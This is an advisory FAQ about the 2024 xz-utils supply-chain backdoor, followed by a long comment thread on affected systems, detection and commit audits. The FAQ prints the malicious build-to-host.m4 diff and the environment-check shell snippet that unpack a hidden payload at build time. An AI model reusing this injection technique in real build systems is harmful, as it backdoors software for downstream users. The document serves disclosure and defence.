
##
#
https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27
#
https://news.ycombinator.com/item?id=39877267

https://news.ycombinator.com/item?id=39877312
#
##



# FAQ on the xz-utils backdoor


Background
On March 29th, 2024, a backdoor was discovered in xz-utils, a suite of software that gives developers lossless compression. This package is commonly used for compressing release tarballs, software packages, kernel images, and initramfs images. It is very widely distributed, statistically your average Linux or macOS system will have it installed for convenience.

This backdoor is very indirect and only shows up when a few known specific criteria are met. Others may be yet discovered! However, this backdoor is at least triggerable by remote unprivileged systems connecting to public SSH ports. This has been seen in the wild where it gets activated by connections - resulting in performance issues, but we do not know yet what is required to bypass authentication (etc) with it.

We're reasonably sure the following things need to be true for your system to be vulnerable:

You need to be running a distro that uses glibc (for IFUNC)
You need to have versions 5.6.0 or 5.6.1 of xz or liblzma installed (xz-utils provides the library liblzma) - likely only true if running a rolling-release distro and updating religiously.
We know that the combination of systemd and patched openssh are vulnerable but pending further analysis of the payload, we cannot be certain that other configurations aren't.

While not scaremongering, it is important to be clear that at this stage, we got lucky, and there may well be other effects of the infected liblzma.

If you're running a publicly accessible sshd, then you are - as a rule of thumb for those not wanting to read the rest here - likely vulnerable.

If you aren't, it is unknown for now, but you should update as quickly as possible because investigations are continuing.

TL:DR:

Using a .deb or .rpm based distro with glibc and xz-5.6.0 or xz-5.6.1:
Using systemd on publicly accessible ssh: update RIGHT NOW NOW NOW
Otherwise: update RIGHT NOW NOW but prioritize the former
Using another type of distribution:
With glibc and xz-5.6.0 or xz-5.6.1: update RIGHT NOW, but prioritize the above.
If all of these are the case, please update your systems to mitigate this threat. For more information about affected systems and how to update, please see this article or check the xz-utils page on Repology.

This is still a new situation. There is a lot we don't know. We don't know if there are more possible exploit paths. We only know about this one path. Please update your systems regardless. Unknown unknowns are safer than known unknowns.

This is a living document. Everything in this document is made in good faith of being accurate, but like I just said; we don't know much about what's going on.

This is not a fault of sshd, systemd, or glibc, that is just how it was made exploitable.

Design
This backdoor has several components. At a high level:

The release tarballs upstream publishes don't have the same code that GitHub has. This is common in C projects so that downstream consumers don't need to remember how to run autotools and autoconf. The version of build-to-host.m4 in the release tarballs differs wildly from the upstream on GitHub.
There are crafted test files in the tests/ folder within the git repository too. These files are in the following commits:
tests/files/bad-3-corrupt_lzma2.xz (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1)
tests/files/good-large_compressed.lzma (cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0, 74b138d2a6529f2c07729d7c77b1725a8e8b16f1)
A script called by build-to-host.m4 that unpacks this malicious test data and uses it to modify the build process.
IFUNC, a mechanism in glibc that allows for indirect function calls, is used to perform runtime hooking/redirection of OpenSSH's authentication routines. IFUNC is a tool that is normally used for legitimate things, but in this case it is exploited for this attack path.
Normally upstream publishes release tarballs that are different than the automatically generated ones in GitHub. In these modified tarballs, a malicious version of build-to-host.m4 is included to execute a script during the build process.

This script (at least in versions 5.6.0 and 5.6.1) checks for various conditions like the architecture of the machine. Here is a snippet of the malicious script that gets unpacked by build-to-host.m4 and an explanation of what it does:

if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then

If amd64/x86_64 is the target of the build
And if the target uses the name linux-gnu (mostly checks for the use of glibc)
It also checks for the toolchain being used:
```
  if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
  exit 0
  fi
  if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
  exit 0
  fi
  LDv=$LD" -v"
  if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
  exit 0
```
And if you are trying to build a Debian or Red Hat package:

if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then

This attack thusly seems to be targeted at amd64 systems running glibc using either Debian or Red Hat derived distributions. Other systems may be vulnerable at this time, but we don't know.

Design specifics
```
$ git diff m4/build-to-host.m4 ~/data/xz/xz-5.6.1/m4/build-to-host.m4
diff --git a/m4/build-to-host.m4 b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
index f928e9ab..d5ec3153 100644
--- a/m4/build-to-host.m4
+++ b/home/sam/data/xz/xz-5.6.1/m4/build-to-host.m4
@@ -1,4 +1,4 @@
-# build-to-host.m4 serial 3
+# build-to-host.m4 serial 30
 dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],
 
   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  else
+    gl_[$1]_config=''
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])
 
 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl

```
Payload
If those conditions check, the payload is injected into the source tree. We have not analyzed this payload in detail. Here are the main things we know:

The payload activates if the running program has the process name /usr/sbin/sshd. Systems that put sshd in /usr/bin or another folder may or may not be vulnerable.
It may activate in other scenarios too, possibly even unrelated to ssh.
We don't know what the payload is intended to do. We are investigating.
Vanilla upstream OpenSSH isn't affected unless one of its dependencies links liblzma.
The payload is loaded into sshd indirectly. sshd is often patched to support systemd-notify so that other services can start when sshd is running. liblzma is loaded because it's depended on by other parts of libsystemd. This is not the fault of systemd, this is more unfortunate. The patch that most distributions use is available here: openssh/openssh-portable#375.
If this payload is loaded in openssh sshd, the RSA_public_decrypt function will be redirected into a malicious implementation. We have observed that this malicious implementation can be used to bypass authentication. Further research is being done to explain why.
Filippo Valsorda has shared analysis indicating that the attacker must supply a key which is verified by the payload and then attacker input is passed to system(), giving remote code execution (RCE).
People
We do not want to speculate on the people behind this project in this document. This is not a productive use of our time, and law enforcement will be able to handle identifying those responsible. They are likely patching their systems too.

xz-utils has two maintainers:

Lasse Collin (Larhzu) who has maintained xz since the beginning (~2009), and before that, lzma-utils.
Jia Tan (JiaT75) who started contributing to xz in the last 2-2.5 years and gained commit access, and then release manager rights, about 1.5 years ago.
Lasse regularly has internet breaks and is on one at the moment, started before this all kicked off. He has posted an update at https://tukaani.org/xz-backdoor/ and is working with the community.

Please be patient with him as he gets up to speed and takes time to analyse the situation carefully.

Misc notes
Please do not use ldd on untrusted binaries
[PATCH] ldd: Do not recommend binutils as the safer option
Analysis of the payload
This is the part which is very much in flux, even compared to the rest of this. It's early days yet.

xz/liblzma: Bash-stage Obfuscation Explained by gynvael
Filippo Valsorda's bluesky thread
XZ Backdoor Analysis by @smx-smx (WIP)
xz backdoor documentation wiki
modify_ssh_rsa_pubkey.py by @keeganryan - script to trigger more parts of the payload in a compromised sshd
Other projects
There are concerns some other projects are affected (either by themselves or changes to other projects were made to facilitate the xz backdoor). I want to avoid a witch-hunt but listing some examples here which are already been linked widely to give some commentary.

libarchive is being checked out:

libarchive/libarchive#2103 coordinates the review effort
libarchive/libarchive#1609 was made by Jia Tan
After review, libarchive/libarchive#2101 was made by libarchive maintainers.
It doesn't appear exploitable but the change in libarchive/libarchive#2101 was made out of caution.
google/oss-fuzz#10667 was made by Jia Tan to disable IFUNC in oss-fuzz when testing xz-utils

It is unclear if this was safe or not. Obviously, it doesn't look great, but see below.
Note that IFUNC is a brittle mechanism and it is known to be sensitive to e.g. ASAN, which is why the change didn't raise alarm bells. i.e. It is possible that such a change was genuinely made in good faith, although it's of course suspicious in hindsight. But I wouldn't say the oss-fuzz maintainers should have rejected it, either.
Acknowledgements
Andres Freund who discovered the issue and reported it to linux-distros and then oss-security.
All the hard-working security teams helping to coordinate a response and push out fixes.
Xe Iaso who resummarized this page for readability.
TODO for this doc
Mention the CMake landlock thing
Add a table of releases + signer?
Include the injection script after the macro
Mention detection?
TODO overall
Anyone can and should work on these. I'm just listing them so people have a rough idea of what's left.

Ensuring Lasse Collin and xz-utils is supported, even long after the fervour is over
Reverse engineering the payload (it's still fairly early days here on this)
Auditing all possibly-tainted xz-utils commits
Investigate other paths for sshd to get liblzma in its process (not just via libsystemd, or at least not directly)
(Pretty confident some exist, others have mentioned libselinux & pam but I've not checked it yet.)
Checking other projects for similar injection mechanisms (e.g. similar build system lines)
???
References
https://lwn.net/Articles/967180/
https://www.openwall.com/lists/oss-security/2024/03/29/4
https://boehs.org/node/everything-i-know-about-the-xz-backdoor
https://tukaani.org/xz-backdoor/
Load earlier comments...
@AlexBaranowski
AlexBaranowski commented 11 hours ago • 
btw, I see mention of W11, isn't there also WSL running debian and Ubuntus ? Any potential impact ?

If you've updated either recently, that included the affected packages, enabled systemd and ran sshd that was available openly then yes. But that's a very long stretch as systemd isn't even on by default in WSL.

THIS IS NOT TRUE! A LOT OF DISTROS INCLUDING UBUNTU RUN SYSTEMD BY DEFAULT IN WSL
How do I know that? I made a few distro packages for WSL, some of them even public :). Let's check the default Ubuntu on WSL2:

PS C:\Users\Alex> wsl -d Ubuntu
alex@citadel:/mnt/c/Users/Alex$ ps aux | head -2
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.0 165764 11260 ?        Ss   15:02   0:00 /sbin/init
alex@citadel:/mnt/c/Users/Alex$ ll /sbin/init
lrwxrwxrwx 1 root root 20 Sep 20  2023 /sbin/init -> /lib/systemd/systemd*
alex@citadel:/mnt/c/Users/Alex$ cat /etc/wsl.conf

[boot]
systemd=true
https://learn.microsoft.com/en-us/windows/wsl/systemd

@TyrHeimdalEVE @thesamesam @Z-nonymous The WSL systems might be vulnerable.

@timtas
timtas commented 11 hours ago
btw, I see mention of W11, isn't there also WSL running debian and Ubuntus ? Any potential impact ?

If you've updated either recently, that included the affected packages, enabled systemd and ran sshd that was available openly then yes. But that's a very long stretch as systemd isn't even on by default in WSL.

THIS IS NOT TRUE! A LOT OF DISTROS INCLUDING UBUNTU RUN SYSTEMD BY DEFAULT IN WSL
How do I know that? I made a few distro packages for WSL, some of them even public :). Let's check the default Ubuntu on WSL2:

PS C:\Users\Alex> wsl -d Ubuntu
alex@citadel:/mnt/c/Users/Alex$ ps aux | head -2
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.0 165764 11260 ?        Ss   15:02   0:00 /sbin/init
alex@citadel:/mnt/c/Users/Alex$ ll /sbin/init
lrwxrwxrwx 1 root root 20 Sep 20  2023 /sbin/init -> /lib/systemd/systemd*
alex@citadel:/mnt/c/Users/Alex$ cat /etc/wsl.conf

[boot]
systemd=true
https://learn.microsoft.com/en-us/windows/wsl/systemd

@TyrHeimdalEVE @thesamesam @Z-nonymous The WSL systems might be vulnerable.

So what? Are we now starting to fix Microsoft's problems? Funny, where Linux stands now at the moment, as some kind of Microsoft Windows subsystem?

@TommyTran732
TommyTran732 commented 10 hours ago
btw, I see mention of W11, isn't there also WSL running debian and Ubuntus ? Any potential impact ?

If you've updated either recently, that included the affected packages, enabled systemd and ran sshd that was available openly then yes. But that's a very long stretch as systemd isn't even on by default in WSL.

THIS IS NOT TRUE! A LOT OF DISTROS INCLUDING UBUNTU RUN SYSTEMD BY DEFAULT IN WSL
How do I know that? I made a few distro packages for WSL, some of them even public :). Let's check the default Ubuntu on WSL2:

PS C:\Users\Alex> wsl -d Ubuntu
alex@citadel:/mnt/c/Users/Alex$ ps aux | head -2
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.0 165764 11260 ?        Ss   15:02   0:00 /sbin/init
alex@citadel:/mnt/c/Users/Alex$ ll /sbin/init
lrwxrwxrwx 1 root root 20 Sep 20  2023 /sbin/init -> /lib/systemd/systemd*
alex@citadel:/mnt/c/Users/Alex$ cat /etc/wsl.conf

[boot]
systemd=true
https://learn.microsoft.com/en-us/windows/wsl/systemd

@TyrHeimdalEVE @thesamesam @Z-nonymous The WSL systems might be vulnerable.

What version of xz-utils is in WSL though? On my normal Ubuntu Mantic VM it's still 5.4.x
Screenshot 2024-03-31 at 00 33 35

@TommyTran732
TommyTran732 commented 10 hours ago
btw, I see mention of W11, isn't there also WSL running debian and Ubuntus ? Any potential impact ?

If you've updated either recently, that included the affected packages, enabled systemd and ran sshd that was available openly then yes. But that's a very long stretch as systemd isn't even on by default in WSL.

THIS IS NOT TRUE! A LOT OF DISTROS INCLUDING UBUNTU RUN SYSTEMD BY DEFAULT IN WSL
How do I know that? I made a few distro packages for WSL, some of them even public :). Let's check the default Ubuntu on WSL2:

PS C:\Users\Alex> wsl -d Ubuntu
alex@citadel:/mnt/c/Users/Alex$ ps aux | head -2
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.0 165764 11260 ?        Ss   15:02   0:00 /sbin/init
alex@citadel:/mnt/c/Users/Alex$ ll /sbin/init
lrwxrwxrwx 1 root root 20 Sep 20  2023 /sbin/init -> /lib/systemd/systemd*
alex@citadel:/mnt/c/Users/Alex$ cat /etc/wsl.conf

[boot]
systemd=true
https://learn.microsoft.com/en-us/windows/wsl/systemd
@TyrHeimdalEVE @thesamesam @Z-nonymous The WSL systems might be vulnerable.

So what? Are we now starting to fix Microsoft's problems? Funny, where Linux stands now at the moment, as some kind of Microsoft Windows subsystem?

Not helpful man. What is wrong with you?

@zacanger
zacanger commented 9 hours ago • 
What version of xz-utils is in WSL though? On my normal Ubuntu Mantic VM it's still 5.4.x

@TommyTran732 Last I checked (a few years ago) WSL just uses ther chosen distro's package repositories. So for Ubuntu, on everything except noble (24.04), it's 5.4 or 5.2. On noble it was at 5.6.1, but then re-released as 5.6.1+really5.4.5-1. Should be fine unless anyone was testing the upcoming release, or backporting packages.

@threefcata
threefcata commented 9 hours ago
@Z-nonymous I find you very pretentious. On one hand you keep claiming 'this is not against China or Chinese', MEANWHILE, all your apparent genuine questions and reasonable doubts imply something so obvious that you keep denying. Stop even trying to fool everyone, do you think nobody sees what you are trying to get at?

@daniel-dona
daniel-dona commented 7 hours ago
btw, I see mention of W11, isn't there also WSL running debian and Ubuntus ? Any potential impact ?

If you've updated either recently, that included the affected packages, enabled systemd and ran sshd that was available openly then yes. But that's a very long stretch as systemd isn't even on by default in WSL.

THIS IS NOT TRUE! A LOT OF DISTROS INCLUDING UBUNTU RUN SYSTEMD BY DEFAULT IN WSL
How do I know that? I made a few distro packages for WSL, some of them even public :). Let's check the default Ubuntu on WSL2:

PS C:\Users\Alex> wsl -d Ubuntu
alex@citadel:/mnt/c/Users/Alex$ ps aux | head -2
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.0 165764 11260 ?        Ss   15:02   0:00 /sbin/init
alex@citadel:/mnt/c/Users/Alex$ ll /sbin/init
lrwxrwxrwx 1 root root 20 Sep 20  2023 /sbin/init -> /lib/systemd/systemd*
alex@citadel:/mnt/c/Users/Alex$ cat /etc/wsl.conf

[boot]
systemd=true
https://learn.microsoft.com/en-us/windows/wsl/systemd
@TyrHeimdalEVE @thesamesam @Z-nonymous The WSL systems might be vulnerable.

So what? Are we now starting to fix Microsoft's problems? Funny, where Linux stands now at the moment, as some kind of Microsoft Windows subsystem?

Wasn't the initial reporter of the xz-utils backdoor a Microsoft developer? 🤨

@arizvisa
arizvisa commented 7 hours ago • 
@thesamesam, noticed you updated the document with a TODO about verifying commits. I did a preliminary review of the commits to https://git.tukaani.org/?p=xz.git;a=log when it was announced on oss-seccurity. Maybe this list will help others audit the impact of these additions.

e446ab7a18abfde18f8d1cf02a914df72b1370e3 liblzma: Creates separate "safe" range decoder mode.
de5c5e417645ad8906ef914bc059d08c1462fc29 liblzma: Creates Non-resumable and Resumable modes for lzma_decoder.
d0f33d672a4da7985ebb5ba8d829f885de49c171 liblzma: Creates IS_ENC_DICT_SIZE_VALID() macro.
8f236574986e7c414c0ea059f441982d1387e6a4 liblzma: Exports lzma_mt_block_size() as an API function.
3d5a99ca373a4e86faf671226ca6487febb9eeac liblzma: Fix copying of check type statistics in lzma_index_cat().
18d7facd3802b55c287581405c4d49c98708c136 liblzma: lzma_index_append: Add missing integer overflow check.
ae5c07b22a6b3766b84f409f1b6b5c100469068a liblzma: Add overflow check for Unpadded size in lzma_index_append().
455a08609caa3223066a717fb01bfa42c5dba47d liblzma: Refactor crc_common.h.
82ecc538193b380a21622aea02b0ba078e7ade92 liblzma: Fix false Valgrind error report with GCC.
96b663f67c0e738a99ba8f35d9f4ced9add74544 liblzma: Refactor CRC comments.
761f5b69a4c778c8bcb09279b845b07c28790575 liblzma: Rename crc32_aarch64.h to crc32_arm64.h.
other than the crc work, the illegitimate tests, and the broken landlock option, the author also did some work on xz's filter-chains/blocklist-filters (which aren't listed, because I wasn't planning on committing too much time to this audit, but i think they're around 5f0c5a04388f8334962c70bc37a8c2ff8f605e0a if someone else wants to enumerate them).

they also committed two patches in regards to integer overflow checks during encoding (listed in these commits). i haven't really verified the details of these thoroughly, tho. some commits are excluded as they were simple refactors of already-existing code (moving things into macros), language additions, and were definitely not interesting to me personally.

As you've already disclosed from other places, these are the 4 emails that I've seen used by the committer.

Jia Cheong Tan jiat0218@gmail.com
jiat75 jiat0218@gmail.com
Jia Tan jiat0218@gmail.com
Jia Tan jiat75@gmail.com

(edited)
The entire list of commits (mostly documentation, CI, etc...but i honestly didn't put in too much effort) are at: https://gist.github.com/arizvisa/44da5df3f0fdd0b0ae2631fe420503b6

@bwDraco
bwDraco commented 6 hours ago
My Gentoo systems build xz-utils with Clang LTO. Does this circumvent the backdoor?

@githubuser6000
githubuser6000 commented 6 hours ago
@thesamesam Is there a way I can donate to the original maintainer?

@f00b4r0
f00b4r0 commented 6 hours ago • 
@thesamesam dunno if this was mentioned before, but it's not clear from the current FAQ: systems NOT using systemd may still be affected, simply because libsystemd is installed. Case in point: Devuan, which does not use systemd init but still ships a Debian-patched sshd that links in libsystemd and loads liblzma.

https://pkginfo.devuan.org/cgi-bin/package-query.html?c=package&q=openssh-server=1:9.7p1-2+b1
https://pkginfo.devuan.org/cgi-bin/package-query.html?c=package&q=libsystemd0=255.4-1+b1

HTH

@leagris
leagris commented 5 hours ago
What version of xz-utils is in WSL though? On my normal Ubuntu Mantic VM it's still 5.4.x <img alt="Screenshot 2024-03-31 at 00 33

dpkg-query -Wf '${package}\t${Version}\n' '*xz*'
@pillowtrucker
pillowtrucker commented 4 hours ago
@thesamesam dunno if this was mentioned before, but it's not clear from the current FAQ: systems NOT using systemd may still be affected, simply because libsystemd is installed. Case in point: Devuan, which does not use systemd init but still ships a Debian-patched sshd that links in libsystemd and loads liblzma.

https://pkginfo.devuan.org/cgi-bin/package-query.html?c=package&q=openssh-server=1:9.7p1-2+b1 https://pkginfo.devuan.org/cgi-bin/package-query.html?c=package&q=libsystemd0=255.4-1+b1

HTH

looool they bragged the whole day on twitter that they're immune to it because they don't have evil systemd but they're too stupid to know what the package they leeched off debian actually links against

@FlyingFathead
FlyingFathead commented 4 hours ago • 
The release tarballs upstream publishes don't have the same code that GitHub has. This is common in C projects so that downstream consumers don't need to remember how to run autotools and autoconf. The version of build-to-host.m4 in the release tarballs differs wildly from the upstream on GitHub.

After my earlier comment on this yesterday and having slept on it, I no longer can't get past the thought of how this is a prime example of prioritizing convenience over secure practices. The fact that an attack like this can be "slipped in" just like that means that tarball tampering is going to be a target vector for supply chain attacks and other types of code tampering. Especially after this case, now that the cat's out of the bag, so to speak.

Repo tarballs should compare against the repo contents. Having a "single source of truth" for all components of the project is the idea. There is a dire need to ensure consistency between what developers see and work with in the repository and what end users receive in the tarball.

Whatever it introduces in terms of increased complexity, required automation and such, needs to be worked out. Include build tools in the tarball if need be, more robust integrity checks, automated consistency checks, transparent build processes, version-controlled release artifacts, reproducible builds, automated auditing, there's already multiple suggestions on this... perhaps that's a tall order, but right now, this attack implies that any project with a tarball out there might have literally anything in it. There's no other way to put it than the current practice showing a gaping security hole that overall enabled this exploit.

How can we be sure that this method of attack isn't already being utilized in other projects right now?

@smintrh78
smintrh78 commented 4 hours ago
Please consider my contribution to the topic here: Thoughs / suggestions about the xz backdoor

I'd like your point of view. Thanks!

@gh-nate
gh-nate commented 4 hours ago
@thesamesam: Hi, there are coordinated reverse engineering efforts ongoing on chat room(s) as discussed/posted under the linked Openwall oss-security mailing list thread. Is this worth a mention on your gist?

I refrained from posting the exact details here due to the risk of the low quality of the discussion spreading over.

@trip54654
trip54654 commented 4 hours ago • 
IFUNC was added to enable this attack. Is IFUNC actually useful for anything legitimate? I know the attacker convinced glibc that it was, but... it's glibc, they love useless features that complicate everything.

Edit: and in particular, does IFUNC have the potential to reduce security by design?

@jgilbert2017
jgilbert2017 commented 4 hours ago • 
(slightly off topic)
I have submitted a feature request to the c# package management system nuget to request support for publishing packages via source (git commit hash). Publishing is currently achieved via author signed binaries (oof).

Please see the issue below and voice your opinion on this if you have one.
NuGet/NuGetGallery#9889

We should take the lessons learned from this incident and apply them across the entire OSS ecosystem.

@jmakovicka
jmakovicka commented 3 hours ago • 
IFUNC was added to enable this attack. Is IFUNC actually useful for anything legitimate? I know the attacker convinced glibc that it was, but... it's glibc, they love useless features that complicate everything.

They added CPU optimized CRC computation code, which served as a pretext for ifunc usage.

Similarly, the test infrastructure was created as a hideout for the malicious payload.

@AdrianBunk
AdrianBunk commented 2 hours ago
@smintrh78 I've responded there why your suggestion implies that you don't understand the problem.

@teyhouse
teyhouse commented 2 hours ago
I did some testing regarding detecting the CVE inside container images. As of right now, it seems the default container Scan from Trivy does not yet detect CVE-2024-3094, but grype does. I would recommend checking on SBOM-Base, for example:
https://github.com/teyhouse/CVE-2024-3094/blob/main/check_sbom.sh

image

@Sepero
Sepero commented 1 hour ago
If instead of obfuscated code, imagine if the attacker did things a little smarter? Like perhaps an "accidental" buffer overflow (or other memory based exploit)...

@FrankHB
FrankHB commented 1 hour ago
kill the autools, use meson (the philosophy of meson is : only what is in git should go to the dist, there is even no need for a release, just a tag)

Or take a step further: kill binary distro, use source for confidence, in all serious cases. Binaries are only cache. with no more attack surface.
This also prevents vendor lock-in. Consider when you have a compromised meson...

Dear god, what're you trying to do? Make linux unusable? We have gentoo for this which, by the way, was also affected by this XZ backdoor. "Make every distro compiled..."

You seem to forget not everyone has a top of the line CPU. God forbid you like google chrome or any proprietary software...

This has nothing to Linux itself, as this can be a pure userland thing, and I don't say it should prevent you to specify any "source" in the form of precompiled binaries (including the kernel image) once you are already confident enough.

The key point is to make sure each piece of binary code (except locally developed by users) totally artifacts from some really auditable source which is actually used by the system, rather than just some ramdom source packages separately maintained by the upstream repo admins.

This is not far from the spirit of meson mentioned here. It is just a strategy enforced in the whole system by default.

Gentoo is not that unusable the binary cache is effectively shared. A more significant problem is, it seems so unfriendly to carbon footprint in any serious configuration... It is certainly a nonstarter for most users lacking the knowledge about what happens under the hood (esp. to distinguish which parts of the building during the installation are actually totally redundant).

To share the cache efficiently, you have to share the configuartions to precisely reproduce the builds of almost any pieces of software in the system. Unfortunately, most binary distros lack the mechanism to handle such things systemtically. In my best knowledge, nix and guix are a few to get such things virtually right in the basis (purely functional configuration versioning), but still too far from most industrial users.

This also won't automatically solve the problems of inefficient build system, though.

@wtznc
wtznc commented 1 hour ago
GitHub has just restored access to his account. There may be many more repositories where malicious code can be found - e.g. llvm compiler llvm/llvm-project#63957

@SyntaxDreamer
SyntaxDreamer commented 1 hour ago
btw, I see mention of W11, isn't there also WSL running debian and Ubuntus ? Any potential impact ?

If you've updated either recently, that included the affected packages, enabled systemd and ran sshd that was available openly then yes. But that's a very long stretch as systemd isn't even on by default in WSL.

THIS IS NOT TRUE! A LOT OF DISTROS INCLUDING UBUNTU RUN SYSTEMD BY DEFAULT IN WSL
How do I know that? I made a few distro packages for WSL, some of them even public :). Let's check the default Ubuntu on WSL2:

PS C:\Users\Alex> wsl -d Ubuntu
alex@citadel:/mnt/c/Users/Alex$ ps aux | head -2
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.2  0.0 165764 11260 ?        Ss   15:02   0:00 /sbin/init
alex@citadel:/mnt/c/Users/Alex$ ll /sbin/init
lrwxrwxrwx 1 root root 20 Sep 20  2023 /sbin/init -> /lib/systemd/systemd*
alex@citadel:/mnt/c/Users/Alex$ cat /etc/wsl.conf

[boot]
systemd=true
https://learn.microsoft.com/en-us/windows/wsl/systemd
@TyrHeimdalEVE @thesamesam @Z-nonymous The WSL systems might be vulnerable.

So what? Are we now starting to fix Microsoft's problems? Funny, where Linux stands now at the moment, as some kind of Microsoft Windows subsystem?

An infected host, regardless of where or how it is running, affects everyone equally. DoS attacks, spam, relays, etc. Does it matter if it's running under Windows WLS, a VM or docker? No, it does not.

@Leseratte10
Leseratte10 commented 48 minutes ago
GitHub has just restored access to his account.

Doesn't look like it. "JiaT75" is still suspended.

@NuLL3rr0r
NuLL3rr0r commented 48 minutes ago
Somebody created this single page analysis on Twitter.

Also this gist is very intersting.
1000061068

@Leseratte10
Leseratte10 commented 39 minutes ago • 
You're looking in the wrong place. Just because you can see the profile doesn't mean the user isn't suspended

screenshot

@redcode
redcode commented 34 minutes ago
You're looking in the wrong place. Just because you can see the profile doesn't mean the user isn't suspended

Ah, yes, sorry, you're right.

@thimslugga
thimslugga commented 25 minutes ago
GitHub has just restored access to his account. There may be many more repositories where malicious code can be found - e.g. llvm compiler llvm/llvm-project#63957

Perfect, now they can return back to doing their part as a little “helper elf”. Lol, perhaps a very subtle cue to what they had on their mind.

Just trying to do my part as a helper elf!

Jia Tan

https://www.mail-archive.com/xz-devel@tukaani.org/msg00518.html
